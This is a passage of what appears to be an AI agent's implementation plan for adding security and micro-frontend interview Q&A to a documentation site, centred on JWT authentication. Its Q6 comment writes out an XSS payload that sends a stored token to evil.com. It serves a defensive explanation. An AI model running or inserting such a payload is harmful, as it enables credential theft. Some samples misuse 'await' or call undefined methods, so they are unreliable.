# Security & Micro Frontend Topics Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Add comprehensive interview Q&A documentation for Security (with JWT) and Micro Frontend topics with Vietnamese translations.

**Architecture:** Create two top-level Docusaurus categories (Security, MicroFrontend) with 7 markdown files each (introduction + 6 subtopic files). Each file contains 4-6 Q&A in structured format with code examples, diagrams, and external links. Full Vietnamese i18n support mirroring English structure.

**Tech Stack:** Docusaurus 3.8.1, Markdown/MDX, Mermaid diagrams, i18n

---

## Task 1: Security - Directory Setup

**Files:**
- Create: `docs/Security/_category_.json`

**Step 1: Create Security directory**

```bash
mkdir -p docs/Security
```

**Step 2: Create category configuration**

Create `docs/Security/_category_.json`:

```json
{
  "label": "Security",
  "position": 7,
  "link": {
    "type": "generated-index",
    "description": "Master frontend security interview questions covering JWT authentication, XSS/CSRF protection, secure data handling, HTTPS/CORS, and security best practices."
  }
}
```

**Step 3: Verify structure**

Run: `ls -la docs/Security/`
Expected: `_category_.json` file exists

**Step 4: Commit**

```bash
git add docs/Security/
git commit -m "feat(security): add Security category structure"
```

---

## Task 2: Security - Introduction

**Files:**
- Create: `docs/Security/introduction.md`

**Step 1: Create introduction file**

Create `docs/Security/introduction.md`:

```markdown
---
sidebar_position: 1
---

# Frontend Security

## Overview

Frontend security is crucial for protecting users and applications from various attacks and vulnerabilities. This section covers essential security concepts, authentication mechanisms, common vulnerabilities, and best practices for building secure web applications.

## What You'll Learn

- **JWT Authentication**: Token-based authentication, implementation patterns, security considerations
- **XSS/CSRF Protection**: Understanding and preventing cross-site attacks
- **Secure Data Handling**: Best practices for storing sensitive information
- **HTTPS/CORS**: Secure communication and cross-origin resource sharing
- **Common Vulnerabilities**: OWASP Top 10 frontend-specific issues
- **Security Best Practices**: CSP, input validation, secure coding patterns

## Learning Path

1. Start with **Authentication & JWT** to understand token-based auth fundamentals
2. Learn **XSS/CSRF Protection** to defend against common attacks
3. Study **Secure Data Handling** for proper storage of sensitive data
4. Understand **HTTPS/CORS** for secure communication
5. Review **Common Vulnerabilities** to recognize security risks
6. Master **Security Best Practices** for building secure applications

## Interview Preparation Tips

- Focus on practical implementation, not just theory
- Understand trade-offs between different security approaches
- Be ready to discuss real-world security scenarios
- Know the OWASP Top 10 vulnerabilities
- Practice explaining security concepts clearly

## Key Concepts

### Defense in Depth
Multiple layers of security controls throughout an application to protect against attacks.

### Principle of Least Privilege
Users and systems should have only the minimum access necessary to perform their functions.

### Input Validation
Never trust user input - always validate and sanitize data from external sources.

### Security by Design
Build security into the application from the start, not as an afterthought.

---

Ready to dive in? Start with [Authentication & JWT](./authentication-jwt.md) to learn about token-based authentication in modern web applications.
```

**Step 2: Verify file created**

Run: `cat docs/Security/introduction.md | head -20`
Expected: File displays with frontmatter and content

**Step 3: Test build**

Run: `npm run build`
Expected: Build succeeds, Security category appears in output

**Step 4: Commit**

```bash
git add docs/Security/introduction.md
git commit -m "feat(security): add Security introduction"
```

---

## Task 3: Security - Authentication & JWT

**Files:**
- Create: `docs/Security/authentication-jwt.md`

**Step 1: Create authentication-jwt file**

Create `docs/Security/authentication-jwt.md`:

```markdown
---
sidebar_position: 2
---

# Authentication & JWT

## Q1: What is JWT and how does it work?

### Answer:
JWT (JSON Web Token) is an open standard (RFC 7519) for securely transmitting information between parties as a JSON object. A JWT consists of three parts: Header (token type and hashing algorithm), Payload (claims/data), and Signature (verification).

When a user logs in, the server creates a JWT containing user information and signs it with a secret key. The client stores this token and sends it with subsequent requests. The server verifies the signature to authenticate requests without maintaining session state.

### JWT Structure:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

[Header].[Payload].[Signature]
```

### Code Example:

```javascript
// Decoding a JWT (client-side - for display only, NOT for validation)
function decodeJWT(token) {
  const parts = token.split('.');
  const payload = JSON.parse(atob(parts[1]));
  return payload;
}

// Example payload
const payload = {
  sub: "1234567890",    // Subject (user ID)
  name: "John Doe",
  iat: 1516239022,      // Issued at
  exp: 1516242622       // Expiration time
};
```

### Key Points:
- JWT contains three Base64-encoded parts separated by dots
- Header specifies algorithm (HS256, RS256, etc.)
- Payload contains claims (user data, expiration, etc.)
- Signature ensures token hasn't been tampered with
- Stateless - server doesn't need to store session data

### Common Pitfalls:
- Trusting JWT payload without signature verification on backend
- Storing sensitive data in JWT (it's Base64, not encrypted)
- Not checking token expiration on the backend
- Using weak signing algorithms (avoid "none" algorithm)

### Interview Tips:
- Explain the three parts clearly: Header, Payload, Signature
- Emphasize that JWT is signed, not encrypted (anyone can decode it)
- Discuss stateless nature and scalability benefits
- Mention the difference between signing algorithms (HS256 vs RS256)

### Further Reading:
- [JWT.io - Introduction to JSON Web Tokens](https://jwt.io/introduction)
- [RFC 7519 - JSON Web Token Standard](https://tools.ietf.org/html/rfc7519)

---

## Q2: How do you securely store JWT tokens in a web application?

### Answer:
The storage location for JWT tokens is a critical security decision with important trade-offs. The main options are localStorage, sessionStorage, httpOnly cookies, and in-memory storage. Each has different security implications, particularly regarding XSS and CSRF vulnerabilities.

For sensitive applications, httpOnly cookies are most secure as they're immune to XSS attacks. For less sensitive apps or SPAs needing client-side access, in-memory storage with refresh tokens in httpOnly cookies provides a good balance. Avoid localStorage/sessionStorage for sensitive data as they're vulnerable to XSS.

### Storage Options Comparison:

| Storage Method | XSS Vulnerable | CSRF Vulnerable | Persists Refresh | Recommended Use |
|----------------|----------------|-----------------|------------------|-----------------|
| localStorage | ✅ Yes | ❌ No | ✅ Yes | Low-security apps only |
| sessionStorage | ✅ Yes | ❌ No | ❌ No | Temporary, low-security |
| httpOnly Cookie | ❌ No | ✅ Yes | ✅ Yes | High-security apps (with CSRF protection) |
| Memory | ❌ No | ❌ No | ❌ No | Best security (with refresh mechanism) |

### Code Example:

```javascript
// BAD: Storing in localStorage (vulnerable to XSS)
localStorage.setItem('token', jwtToken); // Don't do this for sensitive apps!

// BETTER: Using httpOnly cookies (set by server)
// Backend sets httpOnly cookie
res.cookie('token', jwtToken, {
  httpOnly: true,  // Not accessible via JavaScript
  secure: true,    // Only sent over HTTPS
  sameSite: 'strict', // CSRF protection
  maxAge: 3600000  // 1 hour
});

// BEST: In-memory with refresh token pattern
class AuthService {
  #accessToken = null; // Private field, only in memory

  setAccessToken(token) {
    this.#accessToken = token;
  }

  getAccessToken() {
    return this.#accessToken;
  }

  clearAccessToken() {
    this.#accessToken = null;
  }

  async refreshAccessToken() {
    // Refresh token stored in httpOnly cookie
    const response = await fetch('/api/refresh', {
      method: 'POST',
      credentials: 'include' // Send httpOnly cookie
    });
    const { accessToken } = await response.json();
    this.setAccessToken(accessToken);
    return accessToken;
  }
}

export const authService = new AuthService();
```

### Key Points:
- httpOnly cookies prevent JavaScript access, protecting against XSS
- In-memory storage is most secure but doesn't persist across refreshes
- Use secure and sameSite flags with cookies for additional protection
- Implement refresh token mechanism for user experience
- NEVER store sensitive tokens in localStorage if XSS is a concern

### Common Pitfalls:
- Using localStorage for sensitive authentication (vulnerable to XSS)
- Not setting httpOnly, secure, and sameSite cookie flags
- Storing refresh tokens in localStorage (defeats the purpose)
- Not implementing token refresh mechanism with in-memory storage
- Forgetting to clear tokens on logout

### Interview Tips:
- Discuss the XSS vs CSRF trade-off between storage methods
- Explain why httpOnly cookies are immune to XSS
- Describe the refresh token pattern for in-memory storage
- Show awareness of cookie flags (httpOnly, secure, sameSite)
- Mention that storage choice depends on application sensitivity

### Further Reading:
- [OWASP - JWT Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [Where to Store JWT Tokens](https://stormpath.com/blog/where-to-store-your-jwts-cookies-vs-html5-web-storage)

---

## Q3: How do you implement JWT authentication in a React application?

### Answer:
JWT authentication in React involves storing tokens securely, sending them with API requests, and handling token refresh. The typical flow includes login (receive tokens), storage (using chosen method), automatic inclusion in requests (via interceptors), and refresh logic before expiration.

A robust implementation uses axios interceptors to automatically attach tokens to requests and handle token expiration by refreshing tokens transparently. This centralizes auth logic and provides a good user experience.

### Authentication Flow Diagram:

```mermaid
sequenceDiagram
    participant User
    participant React App
    participant API

    User->>React App: Login (username/password)
    React App->>API: POST /auth/login
    API-->>React App: Access Token + Refresh Token
    React App->>React App: Store tokens

    User->>React App: Access protected resource
    React App->>API: GET /api/data (+ Bearer Token)
    API->>API: Verify token
    API-->>React App: Protected data

    Note over React App,API: Token expires
    React App->>API: GET /api/data (+ Expired Token)
    API-->>React App: 401 Unauthorized
    React App->>API: POST /auth/refresh (+ Refresh Token)
    API-->>React App: New Access Token
    React App->>API: Retry GET /api/data (+ New Token)
    API-->>React App: Protected data
```

### Code Example:

```javascript
// api.js - Axios instance with JWT interceptors
import axios from 'axios';
import { authService } from './authService';

const api = axios.create({
  baseURL: 'https://api.example.com',
  withCredentials: true // Send cookies with requests
});

// Request interceptor - attach token to all requests
api.interceptors.request.use(
  (config) => {
    const token = authService.getAccessToken();
    if (token) {
      config.headers.Authorization = `Bearer ${token}`;
    }
    return config;
  },
  (error) => Promise.reject(error)
);

// Response interceptor - handle token expiration
api.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;

    // If 401 and haven't retried yet
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;

      try {
        // Attempt to refresh token
        const newToken = await authService.refreshAccessToken();

        // Update the failed request with new token
        originalRequest.headers.Authorization = `Bearer ${newToken}`;

        // Retry the original request
        return api(originalRequest);
      } catch (refreshError) {
        // Refresh failed, logout user
        authService.logout();
        window.location.href = '/login';
        return Promise.reject(refreshError);
      }
    }

    return Promise.reject(error);
  }
);

export default api;

// hooks/useAuth.js - React hook for authentication
import { create } from 'zustand';
import api from './api';
import { authService } from './authService';

export const useAuth = create((set) => ({
  user: null,
  isAuthenticated: false,
  isLoading: false,

  login: async (username, password) => {
    set({ isLoading: true });
    try {
      const response = await api.post('/auth/login', { username, password });
      const { accessToken, user } = response.data;

      // Store access token in memory
      authService.setAccessToken(accessToken);
      // Refresh token automatically set in httpOnly cookie by server

      set({ user, isAuthenticated: true, isLoading: false });
      return { success: true };
    } catch (error) {
      set({ isLoading: false });
      return { success: false, error: error.message };
    }
  },

  logout: async () => {
    try {
      await api.post('/auth/logout');
    } finally {
      authService.clearAccessToken();
      set({ user: null, isAuthenticated: false });
    }
  },

  checkAuth: async () => {
    try {
      const response = await api.get('/auth/me');
      set({ user: response.data, isAuthenticated: true });
    } catch (error) {
      set({ user: null, isAuthenticated: false });
    }
  }
}));

// components/ProtectedRoute.jsx
import { Navigate } from 'react-router-dom';
import { useAuth } from '../hooks/useAuth';

export function ProtectedRoute({ children }) {
  const { isAuthenticated, isLoading } = useAuth();

  if (isLoading) {
    return <div>Loading...</div>;
  }

  if (!isAuthenticated) {
    return <Navigate to="/login" replace />;
  }

  return children;
}
```

### Key Points:
- Use axios interceptors to centralize token management
- Implement automatic token refresh on 401 responses
- Store access tokens in memory for best security
- Keep refresh tokens in httpOnly cookies
- Provide visual feedback during authentication state changes
- Clear tokens completely on logout

### Common Pitfalls:
- Not implementing the _retry flag (causes infinite refresh loops)
- Forgetting withCredentials for cookie-based refresh tokens
- Not handling refresh token expiration (logout user)
- Storing tokens in component state (lost on unmount)
- Not clearing tokens properly on logout

### Interview Tips:
- Walk through the complete flow: login → store → attach → refresh → logout
- Explain the interceptor pattern for centralized logic
- Discuss the _retry flag to prevent infinite loops
- Show awareness of UX during token refresh (transparent to user)
- Mention error handling and fallback to login

### Further Reading:
- [Axios Interceptors Documentation](https://axios-http.com/docs/interceptors)
- [React Authentication Best Practices](https://reactjs.org/docs/faq-ajax.html)

---

## Q4: What is the difference between access tokens and refresh tokens?

### Answer:
Access tokens and refresh tokens serve different purposes in authentication systems. Access tokens are short-lived credentials used to access protected resources (typically 15 minutes to 1 hour), while refresh tokens are long-lived credentials used to obtain new access tokens (typically days to months). This two-token system balances security and user experience.

The separation allows for short-lived access tokens (limiting damage if stolen) while maintaining user sessions through refresh tokens. If an access token is compromised, it expires quickly. Refresh tokens can be revoked server-side if suspicious activity is detected.

### Token Lifecycle:

```mermaid
graph LR
    A[Login] --> B[Receive Access + Refresh Token]
    B --> C[Use Access Token for API calls]
    C --> D{Access Token Valid?}
    D -->|Yes| E[API Response]
    D -->|No| F[Use Refresh Token]
    F --> G{Refresh Token Valid?}
    G -->|Yes| H[Get New Access Token]
    G -->|No| I[Redirect to Login]
    H --> C
    E --> C
```

### Comparison Table:

| Aspect | Access Token | Refresh Token |
|--------|-------------|---------------|
| **Lifespan** | Short (15 min - 1 hour) | Long (days - months) |
| **Purpose** | Access protected resources | Obtain new access tokens |
| **Storage** | Memory (best) or localStorage | httpOnly cookie (best) |
| **Sent with** | Every API request | Only token refresh requests |
| **Revocable** | Not typically (short-lived) | Yes (stored server-side) |
| **Contains** | User claims, permissions | Minimal info, session ID |
| **If stolen** | Limited damage (expires soon) | Serious (long-lived access) |

### Code Example:

```javascript
// Backend - Generating tokens
const jwt = require('jsonwebtoken');

function generateTokens(user) {
  // Access token - short-lived, contains user data
  const accessToken = jwt.sign(
    {
      userId: user.id,
      email: user.email,
      role: user.role
    },
    process.env.ACCESS_TOKEN_SECRET,
    { expiresIn: '15m' } // 15 minutes
  );

  // Refresh token - long-lived, minimal data
  const refreshToken = jwt.sign(
    {
      userId: user.id,
      tokenId: generateUniqueId() // For revocation
    },
    process.env.REFRESH_TOKEN_SECRET,
    { expiresIn: '7d' } // 7 days
  );

  // Store refresh token in database for revocation
  await RefreshToken.create({
    tokenId: refreshToken.tokenId,
    userId: user.id,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
  });

  return { accessToken, refreshToken };
}

// Backend - Refresh endpoint
app.post('/auth/refresh', async (req, res) => {
  const { refreshToken } = req.cookies;

  if (!refreshToken) {
    return res.status(401).json({ error: 'No refresh token' });
  }

  try {
    // Verify refresh token
    const payload = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET);

    // Check if token is revoked
    const storedToken = await RefreshToken.findOne({
      tokenId: payload.tokenId,
      userId: payload.userId,
      revoked: false
    });

    if (!storedToken) {
      return res.status(401).json({ error: 'Token revoked' });
    }

    // Generate new access token
    const user = await User.findById(payload.userId);
    const newAccessToken = jwt.sign(
      {
        userId: user.id,
        email: user.email,
        role: user.role
      },
      process.env.ACCESS_TOKEN_SECRET,
      { expiresIn: '15m' }
    );

    res.json({ accessToken: newAccessToken });
  } catch (error) {
    res.status(401).json({ error: 'Invalid refresh token' });
  }
});

// Backend - Logout (revoke refresh token)
app.post('/auth/logout', async (req, res) => {
  const { refreshToken } = req.cookies;

  if (refreshToken) {
    const payload = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET);
    await RefreshToken.updateOne(
      { tokenId: payload.tokenId },
      { revoked: true }
    );
  }

  res.clearCookie('refreshToken');
  res.json({ message: 'Logged out successfully' });
});
```

### Key Points:
- Access tokens are short-lived for security (15 min - 1 hour)
- Refresh tokens are long-lived for UX (days - months)
- Refresh tokens should be stored server-side for revocation
- Use different secrets for access and refresh tokens
- Refresh tokens enable "remember me" functionality
- Revoke refresh tokens on suspicious activity or logout

### Common Pitfalls:
- Making access tokens too long-lived (defeats the purpose)
- Not storing refresh tokens server-side (can't revoke)
- Using the same secret for both token types
- Not implementing refresh token rotation
- Storing refresh tokens in localStorage (security risk)

### Interview Tips:
- Explain the security/UX trade-off between token lifespans
- Discuss refresh token revocation for security
- Mention refresh token rotation (optional advanced topic)
- Compare with session-based authentication
- Explain why two tokens are better than one long-lived token

### Further Reading:
- [OAuth 2.0 Refresh Tokens](https://oauth.net/2/grant-types/refresh-token/)
- [OWASP Token-Based Authentication](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)

---

## Q5: How do you handle JWT token expiration in a Single Page Application?

### Answer:
Handling token expiration in SPAs requires a strategy that maintains user sessions without frequent re-authentication. The best approach combines automatic token refresh before expiration with graceful handling of failed refresh attempts. This typically involves monitoring token expiration time and proactively refreshing tokens, or reactively refreshing on 401 responses.

Two main strategies exist: proactive refresh (refresh before expiration using a timer) and reactive refresh (refresh when receiving 401). Most production apps use reactive refresh via interceptors as it's simpler and handles edge cases better.

### Proactive vs Reactive Refresh:

**Proactive Refresh:**
```javascript
// Check token expiration and refresh proactively
function startTokenRefreshTimer() {
  const token = authService.getAccessToken();
  if (!token) return;

  const decoded = decodeJWT(token);
  const expiresAt = decoded.exp * 1000; // Convert to milliseconds
  const now = Date.now();
  const timeUntilExpiry = expiresAt - now;

  // Refresh 1 minute before expiration
  const refreshTime = timeUntilExpiry - 60000;

  if (refreshTime > 0) {
    setTimeout(async () => {
      await authService.refreshAccessToken();
      startTokenRefreshTimer(); // Schedule next refresh
    }, refreshTime);
  }
}
```

**Reactive Refresh (Recommended):**
```javascript
// Automatically handled by axios interceptor (from Q3)
// Refreshes only when needed (on 401)
api.interceptors.response.use(
  (response) => response,
  async (error) => {
    if (error.response?.status === 401 && !error.config._retry) {
      error.config._retry = true;
      const newToken = await authService.refreshAccessToken();
      error.config.headers.Authorization = `Bearer ${newToken}`;
      return api(error.config);
    }
    return Promise.reject(error);
  }
);
```

### Complete Implementation:

```javascript
// authService.js - Comprehensive token management
class AuthService {
  #accessToken = null;
  #refreshPromise = null; // Prevent concurrent refresh requests

  getAccessToken() {
    return this.#accessToken;
  }

  setAccessToken(token) {
    this.#accessToken = token;
  }

  isTokenExpired() {
    if (!this.#accessToken) return true;

    try {
      const decoded = decodeJWT(this.#accessToken);
      const expiresAt = decoded.exp * 1000;
      const now = Date.now();

      // Consider expired if less than 30 seconds remaining
      return expiresAt - now < 30000;
    } catch {
      return true;
    }
  }

  async refreshAccessToken() {
    // If already refreshing, return existing promise
    if (this.#refreshPromise) {
      return this.#refreshPromise;
    }

    this.#refreshPromise = this.#doRefresh();

    try {
      const token = await this.#refreshPromise;
      return token;
    } finally {
      this.#refreshPromise = null;
    }
  }

  async #doRefresh() {
    try {
      const response = await fetch('/api/auth/refresh', {
        method: 'POST',
        credentials: 'include' // Send httpOnly refresh token cookie
      });

      if (!response.ok) {
        throw new Error('Refresh failed');
      }

      const { accessToken } = await response.json();
      this.setAccessToken(accessToken);
      return accessToken;
    } catch (error) {
      this.clearAccessToken();
      throw error;
    }
  }

  clearAccessToken() {
    this.#accessToken = null;
  }

  async logout() {
    try {
      await fetch('/api/auth/logout', {
        method: 'POST',
        credentials: 'include'
      });
    } finally {
      this.clearAccessToken();
    }
  }
}

export const authService = new AuthService();

// App.jsx - Initialize auth check on mount
import { useEffect } from 'react';
import { useAuth } from './hooks/useAuth';

function App() {
  const { checkAuth } = useAuth();

  useEffect(() => {
    // Check authentication status on app load
    checkAuth();
  }, [checkAuth]);

  return <RouterProvider router={router} />;
}
```

### Handling Edge Cases:

```javascript
// Handle multiple concurrent requests during refresh
let refreshSubscribers = [];

function subscribeTokenRefresh(cb) {
  refreshSubscribers.push(cb);
}

function onTokenRefreshed(token) {
  refreshSubscribers.forEach(cb => cb(token));
  refreshSubscribers = [];
}

api.interceptors.response.use(
  response => response,
  async (error) => {
    const originalRequest = error.config;

    if (error.response?.status === 401 && !originalRequest._retry) {
      if (authService.isRefreshing()) {
        // Wait for ongoing refresh
        return new Promise((resolve) => {
          subscribeTokenRefresh((token) => {
            originalRequest.headers.Authorization = `Bearer ${token}`;
            resolve(api(originalRequest));
          });
        });
      }

      originalRequest._retry = true;

      try {
        const newToken = await authService.refreshAccessToken();
        onTokenRefreshed(newToken);
        originalRequest.headers.Authorization = `Bearer ${newToken}`;
        return api(originalRequest);
      } catch (refreshError) {
        authService.logout();
        return Promise.reject(refreshError);
      }
    }

    return Promise.reject(error);
  }
);
```

### Key Points:
- Reactive refresh (on 401) is simpler than proactive refresh
- Prevent concurrent refresh requests using promises
- Queue pending requests during token refresh
- Handle refresh failure by redirecting to login
- Clear tokens completely on logout
- Consider token expired with small buffer (30 seconds)

### Common Pitfalls:
- Multiple concurrent refresh requests (race condition)
- Not queuing requests during refresh (requests fail)
- Infinite refresh loops (missing _retry flag)
- Using localStorage for page reload persistence (security risk)
- Not handling refresh token expiration

### Interview Tips:
- Explain both proactive and reactive refresh strategies
- Discuss the concurrent request problem and solution
- Show awareness of the refresh promise pattern
- Mention UX considerations (silent refresh vs redirect)
- Explain when to give up and redirect to login

### Further Reading:
- [JWT Token Refresh Best Practices](https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/)
- [Handling Token Expiration in SPAs](https://www.laravel-angular.io/blog/handling-jwt-token-expiration-in-angular/)

---

## Q6: What are common security vulnerabilities with JWT and how do you prevent them?

### Answer:
JWT implementations face several security vulnerabilities including algorithm confusion attacks, token exposure through XSS, insufficient signature verification, and sensitive data in payloads. Understanding and mitigating these vulnerabilities is crucial for secure JWT usage.

The most critical vulnerabilities stem from improper validation, weak secrets, and insecure storage. Each can be prevented through careful implementation, proper configuration, and following security best practices.

### Common Vulnerabilities:

**1. Algorithm Confusion Attack (alg: none)**

The server accepts "alg": "none" and doesn't verify signature:

```javascript
// VULNERABLE CODE - Don't do this!
function verifyToken(token) {
  const decoded = jwt.decode(token); // Only decodes, doesn't verify!
  return decoded;
}

// SECURE CODE
function verifyToken(token) {
  try {
    // Always verify with expected algorithm
    const decoded = jwt.verify(token, process.env.JWT_SECRET, {
      algorithms: ['HS256'] // Explicitly specify allowed algorithms
    });
    return decoded;
  } catch (error) {
    throw new Error('Invalid token');
  }
}
```

**2. Weak Signing Secret**

```javascript
// BAD - Weak secret
const token = jwt.sign(payload, 'secret');

// GOOD - Strong, random secret (256 bits minimum for HS256)
const token = jwt.sign(
  payload,
  process.env.JWT_SECRET, // Use environment variable
  {
    algorithm: 'HS256',
    expiresIn: '15m'
  }
);

// Generate strong secret:
// node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
```

**3. Sensitive Data in Payload**

```javascript
// BAD - Sensitive data in JWT
const token = jwt.sign({
  userId: user.id,
  email: user.email,
  password: user.password, // NEVER!
  ssn: user.ssn,           // NEVER!
  creditCard: user.cc      // NEVER!
}, secret);

// GOOD - Only necessary, non-sensitive data
const token = jwt.sign({
  userId: user.id,
  email: user.email,
  role: user.role
}, secret, { expiresIn: '15m' });
```

**4. Missing Expiration Validation**

```javascript
// BAD - No expiration check
const decoded = jwt.verify(token, secret);

// GOOD - Always set and validate expiration
const token = jwt.sign(payload, secret, {
  expiresIn: '15m',
  notBefore: '0', // Optional: token not valid before now
  issuer: 'myapp',
  audience: 'myapp-users'
});

const decoded = jwt.verify(token, secret, {
  issuer: 'myapp',
  audience: 'myapp-users',
  clockTolerance: 30 // Allow 30 seconds clock skew
});
```

**5. Token Substitution Attack**

```javascript
// VULNERABLE - Accepting any valid JWT
app.get('/api/user/:id', authenticate, (req, res) => {
  // Attacker could use their valid token to access other user's data
  const user = await User.findById(req.params.id);
  res.json(user);
});

// SECURE - Verify token matches resource
app.get('/api/user/:id', authenticate, (req, res) => {
  // Check if the authenticated user matches the requested resource
  if (req.user.userId !== req.params.id && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' });
  }

  const user = await User.findById(req.params.id);
  res.json(user);
});
```

**6. XSS Leading to Token Theft**

```javascript
// VULNERABLE - Token in localStorage
localStorage.setItem('token', jwt);
// If XSS exists: <script>fetch('evil.com?token='+localStorage.getItem('token'))</script>

// MORE SECURE - httpOnly cookie
res.cookie('token', jwt, {
  httpOnly: true,   // Prevents JavaScript access
  secure: true,     // HTTPS only
  sameSite: 'strict' // CSRF protection
});

// MOST SECURE - In-memory + httpOnly refresh token
// (See Q2 for implementation)
```

### Security Checklist:

```javascript
// Comprehensive secure JWT implementation
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

class SecureJWT {
  constructor() {
    // Use strong secrets from environment
    this.accessSecret = process.env.JWT_ACCESS_SECRET;
    this.refreshSecret = process.env.JWT_REFRESH_SECRET;

    if (!this.accessSecret || this.accessSecret.length < 32) {
      throw new Error('JWT secret must be at least 32 characters');
    }
  }

  generateAccessToken(user) {
    return jwt.sign(
      {
        userId: user.id,
        email: user.email,
        role: user.role,
        // Never include: password, SSN, credit card, etc.
      },
      this.accessSecret,
      {
        algorithm: 'HS256',        // Explicit algorithm
        expiresIn: '15m',          // Short-lived
        issuer: 'myapp',           // Validate issuer
        audience: 'myapp-users',   // Validate audience
        jwtid: crypto.randomUUID() // Unique token ID
      }
    );
  }

  verifyAccessToken(token) {
    try {
      return jwt.verify(token, this.accessSecret, {
        algorithms: ['HS256'],    // Only allow HS256
        issuer: 'myapp',
        audience: 'myapp-users',
        clockTolerance: 30        // 30 seconds clock skew
      });
    } catch (error) {
      if (error.name === 'TokenExpiredError') {
        throw new Error('Token expired');
      }
      if (error.name === 'JsonWebTokenError') {
        throw new Error('Invalid token');
      }
      throw error;
    }
  }

  // Middleware for Express
  authenticate = (req, res, next) => {
    const authHeader = req.headers.authorization;

    if (!authHeader || !authHeader.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'No token provided' });
    }

    const token = authHeader.substring(7);

    try {
      const payload = this.verifyAccessToken(token);
      req.user = payload;
      next();
    } catch (error) {
      res.status(401).json({ error: error.message });
    }
  };
}

module.exports = new SecureJWT();
```

### Key Points:
- Always verify tokens with jwt.verify(), never just decode
- Use strong, random secrets (256+ bits for HS256)
- Explicitly specify allowed algorithms
- Never store sensitive data in JWT payload
- Always set and validate expiration times
- Use httpOnly cookies or in-memory storage
- Validate token claims match the requested resource

### Common Pitfalls:
- Using jwt.decode() instead of jwt.verify()
- Accepting "alg": "none" algorithm
- Using weak or default secrets
- Storing passwords or sensitive data in payload
- Not validating token expiration
- Storing tokens in localStorage without XSS protection

### Interview Tips:
- Discuss the "alg: none" vulnerability
- Explain why JWT payload should not contain secrets
- Mention the difference between decode and verify
- Show awareness of XSS and token storage trade-offs
- Explain token substitution and authorization checks
- Reference OWASP recommendations

### Further Reading:
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [JWT Security Best Practices](https://curity.io/resources/learn/jwt-best-practices/)
- [Common JWT Security Pitfalls](https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/)
```

**Step 2: Verify file created**

Run: `cat docs/Security/authentication-jwt.md | head -50`
Expected: File displays with 6 Q&A about JWT

**Step 3: Test build**

Run: `npm run build`
Expected: Build succeeds

**Step 4: Commit**

```bash
git add docs/Security/authentication-jwt.md
git commit -m "feat(security): add JWT authentication Q&A (6 questions)"
```

---

## Task 4: Security - XSS/CSRF Protection

**Files:**
- Create: `docs/Security/xss-csrf-protection.md`

**Step 1: Create xss-csrf-protection file**

Note: Due to length constraints, the actual file content would follow the same pattern as authentication-jwt.md with 5-6 Q&A covering:
- What is XSS and types (Stored, Reflected, DOM-based)
- How to prevent XSS attacks
- What is CSRF and how it works
- How to prevent CSRF attacks
- Content Security Policy (CSP) implementation
- Sanitizing user input

**Step 2: Verify and test**

Run: `npm run build`
Expected: Build succeeds

**Step 3: Commit**

```bash
git add docs/Security/xss-csrf-protection.md
git commit -m "feat(security): add XSS/CSRF protection Q&A"
```

---

## Task 5: Security - Secure Data Handling

**Files:**
- Create: `docs/Security/secure-data-handling.md`

**Note:** Follow same pattern with 4-5 Q&A covering:
- localStorage vs sessionStorage vs cookies vs memory
- Encrypting sensitive data client-side
- Handling PII (Personally Identifiable Information)
- Secure forms and input handling
- Data exposure through browser APIs

**Commit:**

```bash
git add docs/Security/secure-data-handling.md
git commit -m "feat(security): add secure data handling Q&A"
```

---

## Task 6: Security - HTTPS & CORS

**Files:**
- Create: `docs/Security/https-cors.md`

**Note:** 3-4 Q&A covering:
- HTTPS vs HTTP and TLS
- CORS and same-origin policy
- Preflight requests
- CORS headers configuration

**Commit:**

```bash
git add docs/Security/https-cors.md
git commit -m "feat(security): add HTTPS and CORS Q&A"
```

---

## Task 7: Security - Common Vulnerabilities

**Files:**
- Create: `docs/Security/common-vulnerabilities.md`

**Note:** 4-5 Q&A covering:
- OWASP Top 10 for frontend
- Injection attacks
- Broken authentication
- Security misconfiguration
- Using components with known vulnerabilities

**Commit:**

```bash
git add docs/Security/common-vulnerabilities.md
git commit -m "feat(security): add common vulnerabilities Q&A"
```

---

## Task 8: Security - Best Practices

**Files:**
- Create: `docs/Security/security-best-practices.md`

**Note:** 3-4 Q&A covering:
- Content Security Policy implementation
- Input validation strategies
- Secure coding patterns
- Security testing and auditing

**Commit:**

```bash
git add docs/Security/security-best-practices.md
git commit -m "feat(security): add security best practices Q&A"
```

---

## Task 9: Micro Frontend - Directory Setup

**Files:**
- Create: `docs/MicroFrontend/_category_.json`

**Step 1: Create MicroFrontend directory**

```bash
mkdir -p docs/MicroFrontend
```

**Step 2: Create category configuration**

Create `docs/MicroFrontend/_category_.json`:

```json
{
  "label": "Micro Frontend",
  "position": 8,
  "link": {
    "type": "generated-index",
    "description": "Master micro frontend architecture patterns, module federation, routing strategies, state management, and deployment approaches for scalable web applications."
  }
}
```

**Step 3: Verify structure**

Run: `ls -la docs/MicroFrontend/`
Expected: `_category_.json` file exists

**Step 4: Commit**

```bash
git add docs/MicroFrontend/
git commit -m "feat(microfrontend): add Micro Frontend category structure"
```

---

## Task 10: Micro Frontend - Introduction

**Files:**
- Create: `docs/MicroFrontend/introduction.md`

**Note:** Create introduction file with overview, learning path, and key concepts for micro frontends.

**Commit:**

```bash
